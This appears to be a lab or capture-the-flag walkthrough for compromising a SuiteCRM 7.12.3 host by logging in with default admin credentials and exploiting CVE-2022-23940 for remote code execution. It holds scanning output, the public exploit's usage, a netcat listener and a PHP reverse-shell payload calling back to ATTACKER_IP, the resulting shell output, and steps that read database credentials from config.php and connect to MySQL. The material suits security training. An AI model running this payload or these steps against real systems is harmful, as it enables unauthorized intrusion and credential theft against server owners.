# SuiteCRM

SuiteCRM can expose useful version information after login. In the observed path, default `admin:admin` access to SuiteCRM `7.12.3` led to authenticated RCE through `CVE-2022-23940`.

## Discovery

Useful indicators:

```text
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
| http-title: SuiteCRM
|_Requested resource was index.php?action=Login&module=Users
| http-robots.txt: 1 disallowed entry
|_/
3306/tcp  open  mysql   MySQL (unauthorized)
33060/tcp open  mysqlx  MySQL X protocol listener
```

WhatWeb may show:

```text
Apache[2.4.38], Cookies[PHPSESSID], RedirectLocation[index.php?action=Login&module=Users]
Apache[2.4.38], Cookies[sugar_user_theme], HTML5, HttpOnly[sugar_user_theme], JQuery, PHP, PasswordField[username_password], PoweredBy[SugarCRM], Title[SuiteCRM]
```

Useful application paths:

```text
http://TARGET/index.php?action=Login&module=Users
http://TARGET/index.php?module=Home&action=About
http://TARGET/index.php?module=Users&action=ListView&return_module=Users&return_action=DetailView
```

## Default Admin Login

Working credentials:

```text
admin:admin
```

After login, the About page disclosed:

```text
Version 7.12.3
Sugar Version 6.5.25 (Build 344)
```

The user list was viewable from the Users module. Observed usernames:

```text
admin
chris
will
sarah
sally
max
jim
```

## CVE-2022-23940 Authenticated RCE

Public exploit used:

```text
https://github.com/manuelz120/CVE-2022-23940
```

Exploit options:

```text
-h, --host TEXT        Root of SuiteCRM installation
-u, --username TEXT    Username
-p, --password TEXT    Password
-P, --payload TEXT     Shell command to execute on the target
-d, --is_core BOOLEAN  SuiteCRM Core (>= 8.0.0), defaults to False
```

Start a listener:

```bash
nc -nlvp 80
```

Run the exploit with the working admin credentials:

```bash
python3 exploit.py -h http://TARGET -u admin -p admin --payload "php -r '\$sock=fsockopen(\"ATTACKER_IP\", 80); exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
```

Successful output:

```text
INFO:CVE-2022-23940:Login did work - Trying to create scheduled report
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET] PORT
/bin/sh: 0: can't access tty; job control turned off
```

Successful shell context:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux crane 4.19.0-24-amd64 #1 SMP Debian 4.19.282-1 (2023-04-29) x86_64 GNU/Linux
pwd
/var/www/html
```

## Post-Exploitation

Check the SuiteCRM config files in the web root:

```bash
cat config.php
cat config_override.php
```

Useful `config.php` values observed:

```php
'host_name' => 'crane.offsec',
'dbconfig' =>
array (
  'db_host_name' => 'localhost',
  'db_user_name' => 'root',
  'db_password' => '',
  'db_name' => 'suitecrm',
  'db_type' => 'mysql',
  'db_manager' => 'passwordhere',
  'collation' => 'utf8mb4_general_ci',
  'charset' => 'utf8mb4',
),
```

Connect to MySQL locally:

```bash
mysql -u root -h 127.0.0.1 -p
```

Local proof was readable by the web user:

```bash
cat /var/www/local.txt
```

